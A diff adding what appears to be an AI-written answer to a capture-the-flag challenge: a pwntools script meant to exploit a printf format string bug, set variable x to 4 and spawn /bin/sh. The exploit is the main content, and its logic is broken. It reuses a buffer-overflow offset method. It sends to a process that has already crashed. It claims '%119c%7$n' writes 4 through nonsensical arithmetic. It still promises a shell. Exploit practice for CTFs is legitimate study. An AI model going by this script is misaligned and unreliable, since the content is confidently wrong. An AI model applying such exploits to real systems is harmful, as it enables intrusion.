@@ -1,0 +1,68 @@
+To solve this challenge using `pwntools`, we need to exploit the format string vulnerability in the `printf(buf)` call. The goal is to control the value of the variable `x` to make it equal to 4, which will trigger the execution of `/bin/sh`.
+
+Here are the steps and the corresponding code to achieve this:
+
+### Steps:
+1. **Identify the Vulnerability**: The `printf(buf)` call is vulnerable to a format string attack because it uses the user-controlled `buf` directly without specifying a format string.
+2. **Find the Offset**: We need to determine the offset at which the `x` variable is stored on the stack.
+3. **Write the Value**: Use the format string to write the value 4 to the `x` variable.
+4. **Trigger the Shell**: Once `x` is set to 4, the program will execute `/bin/sh`.
+
+### Code:
+
+```python
+from pwn import *
+
+# Set up the process
+context.binary = './fmt'
+p = process('./fmt')
+
+# Find the offset to the x variable
+# You can use pattern_create and pattern_offset to find the offset
+pattern = cyclic(80)
+p.sendline(pattern)
+p.wait()
+core = p.corefile
+stack = core.rsp
+offset = cyclic_find(core.read(stack, 4))
+log.info(f"Offset to x: {offset}")
+
+# Address of x (you might need to adjust this based on your environment)
+x_addr = 0x0804A02C  # Example address, adjust as needed
+
+# Payload to write 4 to x using format string
+payload = b''
+payload += b'A' * offset  # Padding to reach the x variable
+payload += p32(x_addr)    # Address of x
+payload += b'%119c%7$n'   # Write 4 to x (119 - 115 = 4)
+
+# Send the payload
+p.sendline(payload)
+
+# Interact with the shell
+p.interactive()
+```
+
+### Explanation:
+1. **Pattern Creation and Offset Finding**:
+   - `pattern = cyclic(80)`: Creates a unique pattern of 80 bytes.
+   - `p.sendline(pattern)`: Sends the pattern to the program.
+   - `p.wait()`: Waits for the program to crash.
+   - `core = p.corefile`: Loads the core dump of the crashed program.
+   - `stack = core.rsp`: Gets the stack pointer from the core dump.
+   - `offset = cyclic_find(core.read(stack, 4))`: Finds the offset of the pattern in the stack.
+
+2. **Payload Construction**:
+   - `b'A' * offset`: Pads the payload to reach the `x` variable.
+   - `p32(x_addr)`: Converts the address of `x` to a 4-byte little-endian format.
+   - `b'%119c%7$n'`: The format string to write the value 4 to the `x` variable. `%119c` ensures that the next parameter (`%7$n`) writes 4 bytes (119 - 115 = 4).
+
+3. **Sending the Payload**:
+   - `p.sendline(payload)`: Sends the constructed payload to the program.
+   - `p.interactive()`: Interacts with the shell spawned by the program.
+
+### Notes:
+- The address `x_addr` might vary depending on your environment. You can find it by disassembling the binary or using a debugger.
+- The format string `%119c%7$n` is specific to this example. You might need to adjust the number of characters and the parameter index based on the actual layout of the stack.
+
+By following these steps and running the provided code, you should be able to exploit the format string vulnerability and gain a shell.
